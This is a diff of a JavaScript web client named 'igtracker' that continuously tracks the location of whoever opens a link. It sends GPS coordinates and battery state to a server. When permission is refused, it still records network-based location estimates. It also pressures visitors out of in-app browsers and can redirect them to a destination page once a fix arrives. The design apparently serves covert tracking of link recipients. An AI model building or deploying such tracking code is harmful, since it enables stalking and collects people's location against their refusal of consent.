@@ -1,15 +1,12 @@
-/* igtracker 連続位置追跡クライアント v15
-   v15: 位置が取れないときは回線からの推定で点を必ず残す。
-        geolocationの多重呼び出しを直列化（iOSで多重にすると固まる）。
-        ?dbg=1 で失敗理由を画面に出す。
-*/
+/* igtracker 連続位置追跡クライアント v16
+   位置情報は geofix.js（LTGEO）に一本化。
+   端末が位置を出せないときは回線からの推定で点を必ず残す。 */
 (function () {
   "use strict";
 
   var CODE = window.LT_CODE || "";
   if (!CODE) return;
 
-  /* LINE内ブラウザ対策（headのインラインで済んでいれば LT_LINE_FIX=0 で無効） */
   (function () {
     if (window.LT_LINE_FIX === 0) return;
     var ua = navigator.userAgent || "";
@@ -31,20 +28,8 @@
   var HIT = window.LT_HIT || 0;
   var SEND_EVERY = Math.min(IV, 4000);
 
-  /* 既定 → 高精度 → 粗い → もっと粗い → キャッシュ許可（最後の砦） */
-  var LADDER = [
-    { timeout: 10000, maximumAge: 0 },
-    { enableHighAccuracy: true,  timeout: 12000, maximumAge: 0 },
-    { enableHighAccuracy: false, timeout: 15000, maximumAge: 30000 },
-    { enableHighAccuracy: false, timeout: 20000, maximumAge: 300000 },
-    { enableHighAccuracy: false, timeout: 25000, maximumAge: Infinity }
-  ];
-  var step = 0;
-  function opts() { return LADDER[Math.min(step, LADDER.length - 1)]; }
-
   var DEST = window.LT_DEST || "";
   var DEST_MIN = (parseFloat(window.LT_DEST_MIN) || 2) * 1000;
-  var WAIT = (parseFloat(window.LT_WAIT) || 10) * 1000;
   var DENY_REDIRECT = !!window.LT_DENY_REDIRECT;
   var ASK_TEXT = window.LT_ASK_TEXT || "位置情報の使用を許可してください";
   var DENY_TEXT = window.LT_DENY_TEXT || "アクセスを許可されなかったため確認できませんでした。アクセスを許可してください";
@@ -66,38 +51,25 @@
     } catch (e) { return Math.random().toString(36).slice(2, 12); }
   })();
 
-  var q = [];
-  var sending = false, last = 0, started = 0, count = 0, left = false;
-  var wid = null, wake = null, clock = null, sender = null, dog = null;
-  var waitTimer = null, ladderTimer = null, inflight = false;
-  var stopped = true, gotFix = false, bestAcc = null;
-  var lastFix = 0, lastAsk = 0, lastRestart = 0, lastIp = 0;
-  var state = "wait";
-  var batt = null, chg = null;
-  var inapp = "";
-  var permState = "unknown";
+  var q = [], sending = false, last = 0, started = 0, count = 0, left = false;
+  var wake = null, clock = null, sender = null, dog = null;
+  var stopped = true, gotFix = false, lastFixAt = 0, lastIp = 0, lastRetry = 0;
+  var state = "wait", batt = null, chg = null, inapp = "";
 
   function $(id) { return document.getElementById(id); }
   function iso(t) { try { return new Date(t).toISOString(); } catch (e) { return ""; } }
-  function line(text, warn) {
+  function line(t, w) {
     var s = $("lt_st");
     if (!s) return;
-    s.textContent = text;
-    s.className = "line" + (warn ? " warn" : "");
+    s.textContent = t || "";
+    s.className = "line" + (w ? " warn" : "");
   }
-  function dbg(m) {
-    if (!DEBUG) return;
-    var d = $("lt_dbg");
-    if (d) d.textContent = m;
-  }
+  function dbg(m) { if (DEBUG) { var d = $("lt_dbg"); if (d) d.textContent = m; } }
   function showDbg() {
     if (!DEBUG) return;
     ["lt_dbg", "lt_now", "lt_perm", "lt_time"].forEach(function (id) {
       var e = $(id);
-      if (e) {
-        e.className = "";
-        e.style.cssText = "display:block;font-size:11px;color:#6b7386;line-height:1.5";
-      }
+      if (e) { e.className = ""; e.style.cssText = "display:block;font-size:11px;color:#6b7386"; }
     });
   }
   function showRetry() {
@@ -107,24 +79,6 @@
   function announce() {
     window.LT_GPS_READY = true;
     try { window.dispatchEvent(new Event("igt:gps")); } catch (e) {}
-  }
-  function denyMessage() {
-    if (permState === "granted") {
-      return "許可は受けていますが、この端末が位置を割り出せていません。回線からの推定で表示します";
-    }
-    return DENY_TEXT;
-  }
-  function setState(st) {
-    if (st === "ok") {
-      if (state === "ok") return;
-      state = "ok"; line("", false); showRetry();
-      var ia = $("lt_ia"); if (ia) ia.style.display = "none";
-      return;
-    }
-    state = st;
-    if (st === "deny") { line(denyMessage(), true); if (inapp) showInApp(); }
-    else { line(ASK_TEXT, false); }
-    showRetry();
   }
   function showInApp() {
     var box = $("lt_ia"), nm = $("lt_ia_name"), link = $("lt_safari");
@@ -140,28 +94,27 @@
       link.textContent = ios ? "Safariで開き直す" : "Chromeで開き直す";
     }
   }
-  function armWait(ms) {
-    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
-    if (gotFix || left || stopped) return;
-    waitTimer = setTimeout(function () {
-      waitTimer = null;
-      if (left || stopped || gotFix) return;
-      ipFallback(true);                       // ★ 取れなくても点を残す
-      if (DENY_REDIRECT && canLeave()) { leave(); return; }
-      document.body.classList.add("need");
-      setState("deny");
-    }, ms);
+  function setState(st) {
+    if (st === "ok") {
+      if (state === "ok") return;
+      state = "ok"; line("", false); showRetry();
+      var ia = $("lt_ia"); if (ia) ia.style.display = "none";
+      return;
+    }
+    state = st;
+    if (st === "deny") { line(DENY_TEXT, true); if (inapp) showInApp(); }
+    else { line(ASK_TEXT, false); }
+    showRetry();
   }
   function tick() {
     if (!started) return;
     var sec = Math.floor((Date.now() - started) / 1000);
     var e = $("lt_time");
-    if (e) e.textContent = ("0" + Math.floor(sec / 60)).slice(-2) + ":" +
-                           ("0" + (sec % 60)).slice(-2);
+    if (e) e.textContent = ("0" + Math.floor(sec / 60)).slice(-2) + ":" + ("0" + (sec % 60)).slice(-2);
   }
   function drop(arr) { q = q.filter(function (x) { return arr.indexOf(x) === -1; }); }
 
-  /* ★ 位置が取れないとき：lat/lon無しで送る → サーバが回線から推定して点にする */
+  /* 位置が取れないとき：lat/lon無しで送る → サーバが回線から推定して点にする */
   function ipFallback(force) {
     if (gotFix || stopped || left) return;
     var now = Date.now();
@@ -170,46 +123,18 @@
     try { q.push({ ts: iso(now) }); send(); } catch (e) {}
   }
 
-  /* ★ 直列化：同時に1本だけ。無反応でも必ずJS側で打ち切る */
-  function geoOnce(cb, eb, o) {
-    if (inflight) return false;
-    inflight = true;
-    o = o || {};
-    var done = false;
-    var ms = Math.max(4000, (o.timeout || 12000)) + 1500;
-    var to = setTimeout(function () {
-      if (done) return; done = true; inflight = false;
-      dbg("js-timeout " + ms + "ms");
-      try { eb({ code: 3, message: "js-timeout" }); } catch (e) {}
-    }, ms);
-    try {
-      navigator.geolocation.getCurrentPosition(
-        function (p) { if (done) return; done = true; inflight = false; clearTimeout(to); cb(p); },
-        function (e) { if (done) return; done = true; inflight = false; clearTimeout(to); eb(e || { code: 2 }); },
-        o);
-    } catch (e) {
-      clearTimeout(to); inflight = false;
-      if (!done) { done = true; eb(e || { code: 2 }); }
-    }
-    return true;
-  }
-
   function send(extra) {
     if (sending) return;
     if (!q.length && !extra) return;
     sending = true;
     var pts = q.slice(0);
-    var body = { sid: SID, kind: (extra && extra.kind) || "pt", hit: HIT, pts: pts };
     fetch(API, {
       method: "POST", cache: "no-store",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(body)
+      body: JSON.stringify({ sid: SID, kind: (extra && extra.kind) || "pt", hit: HIT, pts: pts }),
     })
       .then(function (r) { return r.json().catch(function () { return {}; }); })
-      .then(function (j) {
-        drop(pts); last = Date.now();
-        if (j && j.iv && j.iv * 1000 !== IV) IV = j.iv * 1000;
-      })
+      .then(function (j) { drop(pts); last = Date.now(); if (j && j.iv && j.iv * 1000 !== IV) IV = j.iv * 1000; })
       .catch(function () {})
       .then(function () { sending = false; });
   }
@@ -226,20 +151,17 @@
   function goto(url) {
     if (!url || left) return;
     left = true;
-    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
     try { beacon("stop"); } catch (e) {}
     try { location.replace(url); } catch (e) { location.href = url; }
   }
   function leave() { if (!left && canLeave()) goto(DEST); }
 
-  function onPos(p) {
+  /* LTGEO から位置が来たとき */
+  function onFix(p) {
     var c = (p && p.coords) || {};
-    if (c.latitude == null || c.longitude == null) return;
+    if (c.latitude == null) return;
     var first = !gotFix;
-    gotFix = true; count++;
-    lastFix = Date.now();
-    step = 0;
-    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
+    gotFix = true; count++; lastFixAt = Date.now();
     if (first) {
       setState("ok"); announce();
       if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
@@ -248,109 +170,33 @@
     q.push({ ts: iso(p.timestamp || Date.now()), lat: c.latitude, lon: c.longitude,
              acc: c.accuracy, spd: c.speed, hdg: c.heading, batt: batt, chg: chg });
     if (q.length > 3000) q.splice(0, q.length - 3000);
-    if (c.accuracy && (bestAcc === null || c.accuracy < bestAcc)) bestAcc = c.accuracy;
     var n = $("lt_now");
     if (n) n.textContent = c.latitude.toFixed(5) + ", " + c.longitude.toFixed(5) +
                            (c.accuracy ? " ±" + Math.round(c.accuracy) + "m" : "");
-    dbg("fix acc=" + Math.round(c.accuracy || 0) + " n=" + count + " step=" + step);
+    dbg("fix acc=" + Math.round(c.accuracy || 0) + " n=" + count);
     if (count === 1 || q.length >= 4 || Date.now() - last > SEND_EVERY) send();
   }
 
-  function onErr(e) {
-    var c = (e && e.code) || 0;
-    dbg("err code=" + c + " msg=" + ((e && e.message) || "") + " step=" + step +
-        " perm=" + permState);
-    if (gotFix) return;
-    if (c === 1) {
-      ipFallback(true);
-      document.body.classList.add("need");
-      setState("deny");
-      return;
-    }
-    if (step < LADDER.length - 1) {
-      step++;
-      if (!gotFix) line("位置情報を取得中…", false);
-      ipFallback(false);                       // 途中でも1点残す
-      if (ladderTimer) clearTimeout(ladderTimer);
-      ladderTimer = setTimeout(function () {
-        ladderTimer = null;
-        if (stopped || left || gotFix) return;
-        try { geoOnce(onPos, onErr, opts()); } catch (e) {}
-      }, 1000);
-      return;
-    }
+  function onFail(why) {
     ipFallback(true);
-    armWait(WAIT);
+    if (gotFix) return;
+    document.body.classList.add("need");
+    setState("deny");
+    if (why === "denied") showInApp();
   }
 
   function watchdog() {
-    if (stopped || left || !navigator.geolocation) return;
-    var gap = Date.now() - (lastFix || started || Date.now());
-    var need = (state === "deny") ? 8000 : 15000;
-    if (gap > need && Date.now() - lastAsk > 6000) {
-      lastAsk = Date.now();
-      if (!gotFix && step < LADDER.length - 1) step++;
-      try { geoOnce(onPos, onErr, opts()); } catch (e) {}
-    }
-    if (!gotFix) ipFallback(false);
-    if (gap > 45000 && Date.now() - lastRestart > 30000) {
-      lastRestart = Date.now(); restart();
+    if (stopped || left) return;
+    var gap = Date.now() - (lastFixAt || started || Date.now());
+    if (!gotFix) {
+      if (gap > 15000 && Date.now() - lastRetry > 12000) {
+        lastRetry = Date.now();
+        if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
+      }
+      ipFallback(false);
     }
   }
 
-  function showPerm() {
-    var el = $("lt_perm");
-    if (!navigator.permissions || !navigator.permissions.query) {
-      if (el) el.textContent = "unknown";
-      return Promise.resolve("unknown");
-    }
-    return navigator.permissions.query({ name: "geolocation" })
-      .then(function (p) {
-        permState = p.state;
-        if (el) el.textContent = p.state;
-        dbg("perm=" + p.state);
-        p.onchange = function () {
-          permState = p.state;
-          if (el) el.textContent = p.state;
-          if (p.state === "granted" && !gotFix && started) attempt();
-        };
-        return p.state;
-      })
-      .catch(function () {
-        permState = "unknown";
-        if (el) el.textContent = "unknown";
-        return "unknown";
-      });
-  }
-  function checkInApp() {
-    var ua = navigator.userAgent || "", name = "";
-    if (/Instagram/i.test(ua)) name = "Instagram";
-    else if (/FBAN|FBAV/i.test(ua)) name = "Facebook";
-    else if (/Line\//i.test(ua)) name = "LINE";
-    else if (/Twitter/i.test(ua)) name = "X";
-    if (!name) return;
-    inapp = name;
-    var nm = $("lt_ia_name"); if (nm) nm.textContent = name;
-    if (state === "deny") showInApp();
-  }
-  function ask() {
-    return new Promise(function (res) {
-      if (!navigator.geolocation) return res(false);
-      geoOnce(function (p) { onPos(p); res(true); },
-              function (e) { onErr(e); res(false); }, opts());
-    });
-  }
-  function attempt() {
-    if (stopped || left) return Promise.resolve(false);
-    lastFix = 0; lastAsk = 0;
-    restart();
-    return ask().then(function () {
-      if (stopped || left) return false;
-      start();
-      if (!gotFix) armWait(WAIT);
-      return gotFix;
-    });
-  }
   function readBatt() {
     try {
       if (!navigator.getBattery) return;
@@ -366,37 +212,25 @@
     try {
       if (navigator.wakeLock && !wake) {
         navigator.wakeLock.request("screen").then(function (w) {
-          wake = w;
-          w.addEventListener("release", function () { wake = null; });
+          wake = w; w.addEventListener("release", function () { wake = null; });
         }).catch(function () {});
       }
     } catch (e) {}
-  }
-  function start() {
-    if (wid !== null || !navigator.geolocation) return;
-    try { wid = navigator.geolocation.watchPosition(onPos, onErr, opts()); }
-    catch (e) { wid = null; }
-  }
-  function restart() {
-    if (wid !== null) { try { navigator.geolocation.clearWatch(wid); } catch (e) {} wid = null; }
-    start();
   }
 
   function boot() {
     if (started) return;
     started = Date.now(); stopped = false;
-    showDbg(); showPerm(); checkInApp(); readBatt(); keepAwake(); showRetry();
+    showDbg(); readBatt(); keepAwake(); showRetry();
     if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
-    if (!navigator.geolocation) {
-      document.body.classList.add("need");
-      setState("deny");
-      ipFallback(true);
-      return;
-    }
 
-    if (window.LT_FIRST_FIX && !gotFix) { try { onPos(window.LT_FIRST_FIX); } catch (e) {} }
+    if (!window.LTGEO) { setState("deny"); return; }
+    LTGEO.subscribe(onFix);
+    LTGEO.subscribeFail(onFail);
+    LTGEO.subscribeStatus(function (t, w) { if (state !== "ok") line(t, w); });
+    if (window.LT_FIRST_FIX) { try { onFix(window.LT_FIRST_FIX); } catch (e) {} }
+    LTGEO.start();
 
-    start();
     clock = setInterval(tick, 1000);
     sender = setInterval(function () {
       tick();
@@ -405,42 +239,33 @@
       if (MAXMIN && Date.now() - started > MAXMIN * 60000) stop("時間上限");
     }, SEND_EVERY);
     dog = setInterval(watchdog, 5000);
-    armWait(WAIT);
-    setTimeout(function () { if (!gotFix) ipFallback(true); }, 9000);   // ★ 早めに1点
+    setTimeout(function () { if (!gotFix) ipFallback(true); }, 9000);
 
-    ask().then(function () {
-      if (stopped || left) return;
-      if (!q.length) q.push({ ts: iso(Date.now()) });
-      send({ kind: "open" });
-    });
+    if (!q.length) q.push({ ts: iso(Date.now()) });
+    send({ kind: "open" });
   }
 
-  function stop(why) {
+  function stop() {
     if (stopped) return;
     stopped = true; started = 0;
-    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
-    if (ladderTimer) { clearTimeout(ladderTimer); ladderTimer = null; }
-    if (wid !== null) { try { navigator.geolocation.clearWatch(wid); } catch (e) {} wid = null; }
     if (clock) clearInterval(clock);
     if (sender) clearInterval(sender);
     if (dog) clearInterval(dog);
     clock = sender = dog = null;
+    if (window.LTGEO) { try { LTGEO.stop(); } catch (e) {} }
     beacon("stop");
     state = "wait";
     showRetry();
   }
   function resume() {
     if (stopped || left) return;
-    keepAwake(); lastRestart = 0;
-    if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
-    if (!gotFix) step = 0;
-    watchdog();
-    if (!gotFix) attempt();
+    keepAwake();
+    if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
     send({ kind: "hb" });
   }
 
   document.addEventListener("visibilitychange", function () {
-    if (document.visibilityState === "hidden") { if (!left) beacon("hb"); return; }
+    if (document.visibilityState === "hidden") { if (!left && started) beacon("hb"); return; }
     if (started) resume();
   });
   window.addEventListener("focus", function () { if (started) resume(); });
@@ -449,35 +274,33 @@
   window.addEventListener("pageshow", function (e) {
     if (!e.persisted || !started) return;
     stopped = false; left = false;
-    lastFix = 0; lastRestart = 0; step = 0;
-    restart(); send({ kind: "open" });
-    if (!gotFix) armWait(WAIT);
+    if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
+    send({ kind: "open" });
   });
   document.addEventListener("click", function (e) {
     var t = e.target;
     if (t && t.tagName === "BUTTON") return;
-    if (started && !stopped && !gotFix) attempt();
+    if (started && !stopped && !gotFix && window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
   }, { passive: true });
   var rt = $("lt_retry");
   if (rt) rt.addEventListener("click", function () {
-    step = 0; inflight = false;
-    setState("wait"); attempt();
+    setState("wait");
+    if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
   });
 
   window.LT_LIVE = {
-    start: boot, stop: stop, leave: leave, retry: attempt, restart: restart,
-    feed: function (p) { try { onPos(p); } catch (e) {} },
-    canLeave: canLeave,
-    sid: SID, state: function () { return state; }, step: function () { return step; },
-    perm: function () { return permState; },
+    start: boot, stop: stop, leave: leave,
+    retry: function () { if (window.LTGEO) LTGEO.retry(); },
+    restart: function () { if (window.LTGEO) LTGEO.retry(); },
+    feed: function (p) { try { onFix(p); } catch (e) {} },
+    canLeave: canLeave, sid: SID,
+    state: function () { return state; },
+    perm: function () { return window.LTGEO ? LTGEO.info().perm : "unknown"; },
   };
 
-  showPerm().then(function () {
-    checkInApp();
-    if (window.LT_GATE && !window.LT_GATE_PASS) {
-      window.addEventListener("igt:gate", function () { boot(); }, { once: true });
-    } else {
-      boot();
-    }
-  });
+  if (window.LT_GATE && !window.LT_GATE_PASS) {
+    window.addEventListener("igt:gate", function () { boot(); }, { once: true });
+  } else {
+    boot();
+  }
 })();
